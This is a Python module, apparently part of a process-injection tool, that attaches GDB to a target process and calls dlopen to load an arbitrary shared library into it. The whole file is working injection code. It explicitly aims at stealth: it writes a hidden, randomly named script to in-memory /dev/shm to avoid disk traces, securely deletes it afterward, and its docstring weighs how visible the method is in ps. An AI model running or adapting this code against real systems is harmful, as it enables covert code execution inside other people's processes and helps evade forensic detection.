"""
core/gdb.py — GDB-based injection fallback.

Works on any architecture GDB supports but is less stealthy than ptrace:
- gdb appears as a child process in ps for the duration of the injection
- a temporary script file is written to /dev/shm (or /tmp)

We use /dev/shm (in-memory FS) when available to avoid disk I/O, and
always securely delete the script regardless of outcome.
"""

import secrets
import subprocess
from pathlib import Path

from utils.log import _log, info, err, DIM, W, RST, InjectionError
from core.stealth import secure_delete

try:
    from utils.log import spinner
except ImportError:
    def spinner(label, duration=1.2):
        pass


_GDB_SCRIPT = """\
set confirm off
set verbose off
attach {pid}
call (void*)dlopen("{lib}", 2)
detach
quit
"""


def inject_via_gdb(pid: int, library: Path) -> bool:
    tmp_dir     = Path("/dev/shm") if Path("/dev/shm").exists() else Path("/tmp")
    script_path = tmp_dir / f".{secrets.token_hex(14)}"

    try:
        script_path.write_text(_GDB_SCRIPT.format(pid=pid, lib=library))
        script_path.chmod(0o600)

        cmd = ["gdb", "--batch", "--quiet", f"--command={script_path}"]
        _log("DEBUG", f"GDB command: {' '.join(cmd)}")

        info(f"Attaching GDB → PID {W}{pid}{RST} …")
        spinner(f"Injecting via GDB into PID {pid}", duration=1.6)

        result = subprocess.run(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=30,
        )

        _log("DEBUG", f"GDB stdout: {result.stdout.decode(errors='replace').strip()}")
        if result.stderr:
            _log("DEBUG", f"GDB stderr: {result.stderr.decode(errors='replace').strip()}")

        if result.returncode != 0:
            stderr = result.stderr.decode(errors="replace").strip()
            err(f"GDB exited with code {result.returncode}.")
            if stderr:
                err(f"GDB stderr (truncated): {DIM}{stderr[:600]}{RST}")
            return False

        return True

    except FileNotFoundError:
        raise InjectionError(
            "gdb executable not found in PATH. "
            "Install gdb or adjust your PATH and try again."
        ) from None
    except subprocess.TimeoutExpired:
        raise InjectionError("GDB timed out after 30 s. Is the target frozen?")
    finally:
        secure_delete(script_path)
